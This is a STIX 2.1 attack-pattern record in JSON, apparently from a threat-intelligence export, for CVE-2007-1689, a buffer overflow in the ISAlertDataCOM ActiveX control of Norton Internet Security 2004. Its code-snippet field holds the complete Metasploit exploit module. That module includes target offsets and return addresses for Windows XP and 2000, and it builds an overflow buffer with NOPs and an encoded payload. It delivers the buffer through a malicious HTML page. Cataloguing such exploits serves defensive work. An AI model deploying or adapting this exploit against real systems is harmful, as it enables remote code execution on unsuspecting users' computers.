{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35ce0b64-aebf-480b-a96f-cc9fa9e2a4c2",
    "created": "2024-08-14T16:42:44.86994Z",
    "modified": "2024-08-14T16:42:44.869944Z",
    "name": "Symantec Norton Internet Security 2004 ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the ISAlertDataCOM ActiveX Control (ISLAert.dll) provided by Symantec Norton Internet Security 2004. By sending an overly long string to the \"Get()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/nis2004_get.rb",
            "external_id": "nis2004_get.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1689"
        },
        {
            "source_name": "reference",
            "url": "http://securityresponse.symantec.com/avcenter/security/Content/2007.05.16.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Norton Internet Security 2004 ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the ISAlertDataCOM ActiveX\n        Control (ISLAert.dll) provided by Symantec Norton Internet Security 2004.\n        By sending an overly long string to the \"Get()\" method, an attacker may be\n        able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-1689' ],\n          [ 'OSVDB', '36164'],\n          [ 'URL', 'http://securityresponse.symantec.com/avcenter/security/Content/2007.05.16.html' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 272, 'Ret' => 0x71aa32ad } ],\n          [ 'Windows 2000 Pro English All',       { 'Offset' => 272, 'Ret' => 0x75022ac4 } ],\n        ],\n      'DisclosureDate' => '2007-05-16',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_alpha(target['Offset']) + Rex::Arch::X86.jmp_short(12)\n    sploit << make_nops(2) + [target.ret].pack('V') + p.encoded\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:BE39AEFD-5704-4BB5-B1DF-B7992454AB7E' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.Get(#{strname});\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-16",
    "x_mitre_platforms": [
        "win'"
    ]
}